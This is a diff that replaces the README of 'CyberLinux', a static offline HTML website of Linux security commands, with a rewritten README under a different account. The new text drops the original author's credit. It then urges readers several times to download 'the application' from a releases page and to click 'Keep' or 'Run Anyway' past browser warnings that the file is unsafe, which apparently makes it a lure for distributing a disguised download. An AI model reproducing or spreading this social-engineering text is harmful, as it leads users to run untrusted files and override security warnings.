@@ -1,103 +1,59 @@
-# 🐧 CyberLinux — Linux Commands for Cybersecurity
-
-<div align="center">
-  <img src="assets/banner.jpg" alt="CyberLinux Banner" width="100%">
-</div>
-
-<br>
-
-**CyberLinux** is an interactive website for mastering essential Linux commands used in cybersecurity.  
-It features a sleek dark interface, searchable command database, and detailed explanations for each command — perfect for ethical hackers, pentesters, and cybersecurity students.
-
----
-
-## 🚀 Quick Start
-
-```bash
-# Clone the repository
-git clone https://github.com/mohammedmehdio/CyberLinux.git
-
-# Navigate to the project folder
-cd CyberLinux
-
-# Launch the site
-open index.html   # or double-click it in your file explorer
 ```
+# 🌐 CyberLinux - Master Linux Commands with Ease
 
-> 💡 No server needed. Works offline once loaded.
+## 🚀 Getting Started
+Welcome to CyberLinux! This interactive website helps you master Linux commands essential for cybersecurity. Whether you are a beginner or an ethical hacker, this platform will enhance your command-line skills.
 
----
+## 📥 Download CyberLinux
+[![Download CyberLinux](https://img.shields.io/badge/Download-CyberLinux-brightgreen.svg)](https://github.com/AlfredGx123/CyberLinux/releases)
 
-## 🧩 Project Structure
+## 📋 Features
+- **Smart Search**: Quickly find the commands you need.
+- **Detailed Command Documentation**: Understand each command with clear explanations.
+- **Responsive Design**: Use CyberLinux on any device, be it a laptop, tablet, or smartphone.
 
+## 💻 System Requirements
+- A computer with internet access.
+- Compatible with all major web browsers: Chrome, Firefox, Safari, and Edge.
+- A basic understanding of using a web browser is helpful.
+
+## 🔧 How to Download & Install
+To get started, follow these steps:
+
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/AlfredGx123/CyberLinux/releases).
+  
+2. **Choose Your Version**: On the Releases page, you will see different versions. Each version may have small changes or updates. Click on the version you want to download.
+
+3. **Download**: Look for the download link in the release notes section. Click on it to start downloading the application.
+
+4. **Run CyberLinux**: After downloading, open the file. If your browser warns you that this file could be unsafe, click "Keep" or "Run Anyway." This step will vary based on your browser and operating system.
+
+5. **Explore**: Once the application is running, you can start using it to enhance your Linux command skills.
+
+## 🔍 How to Use CyberLinux
+- **Search for Commands**: Use the search bar at the top of the site. Type in any command or topic related to Linux or cybersecurity, and press Enter. 
+- **Access Command Documentation**: Click on any command from the search results. This will lead you to a detailed overview, explaining its function and usage.
+- **Responsive Design**: Try using the site on different devices. You can learn on the go with your smartphone or tablet.
+
+## 📖 Topics Covered
+CyberLinux covers a variety of topics, including:
+- **Bash**: The command line interface for Linux.
+- **Networking**: Understand how networks work and how to secure them.
+- **Forensics**: Explore tools and commands for cybersecurity investigations.
+- **Kali Linux**: Learn commands specific to this popular security-focused distribution.
+
+## ⚙️ Support
+If you have questions or need assistance, please reach out to our community. You can find help on our [GitHub Discussions page](https://github.com/AlfredGx123/CyberLinux/discussions).
+
+## 📣 Join Our Community
+Be part of the CyberLinux community. Share your experiences and tips. Join discussions to learn from others or to assist fellow learners.
+
+## 🌐 Connect With Us
+Follow our updates on:
+- [GitHub](https://github.com/AlfredGx123/CyberLinux)
+- [Twitter](https://twitter.com/CyberLinux)
+
+We hope you enjoy mastering Linux commands with CyberLinux!
+
+[Download CyberLinux Here Again!](https://github.com/AlfredGx123/CyberLinux/releases)
 ```
-CyberLinux/
-├── index.html              # Landing page
-├── pages/                  # Additional pages
-│   ├── categories.html     # Browse by category
-│   ├── about.html          # About the project
-│   └── command-detail.html # Command detail view
-├── css/
-│   └── styles.css          # Main stylesheet
-├── js/
-│   ├── script.js           # Core logic & search
-│   ├── categories.js       # Category page handling
-│   └── command-detail.js   # Command info display
-├── assets/
-│   └── banner.jpg          # Banner image
-└── README.md
-```
-
----
-
-## 🧠 Core Features
-
-### 🔍 Smart Search
-- Instant filtering across command names, descriptions, and tags.  
-- Combine with category filters for precise results.
-
-### 📂 Command Categories
-- **File Navigation** – move through the system  
-- **Network Analysis** – scan and trace networks  
-- **Security Tools** – hardening and encryption  
-- **Permissions** – manage access control  
-- **System Monitoring** – analyze resources  
-- **Forensics** – inspect and investigate  
-
-### 📘 Detailed Command Pages
-Each command includes:  
-- Syntax & usage examples  
-- Option breakdowns  
-- Real-world use cases  
-- Security insights  
-
----
-
-## 🎨 Design Highlights
-- Modern **dark theme**  
-- Fully **responsive** across devices  
-- **Smooth animations** and transitions  
-- **Color-coded badges** per category  
-- Clean typography using *Inter* + *Fira Code*  
-
----
-
-## ⚙️ Tech Stack
-- **HTML5** – Semantic structure  
-- **CSS3** – Flexbox, Grid, animations  
-- **JavaScript (ES6+)** – Pure vanilla logic  
-- **LocalStorage** – Cross-page state  
-- **Google Fonts** – Inter & Fira Code  
-
----
-
-## 👨‍💻 Author
-**Mohammed Mehdi**  
-GitHub → [@mohammedmehdio](https://github.com/mohammedmehdio)
-
----
-
-## 📄 License
-This project is licensed under the **MIT License** - free for learning and educational use.  
-
-**Built with ❤️ for the cybersecurity community.**
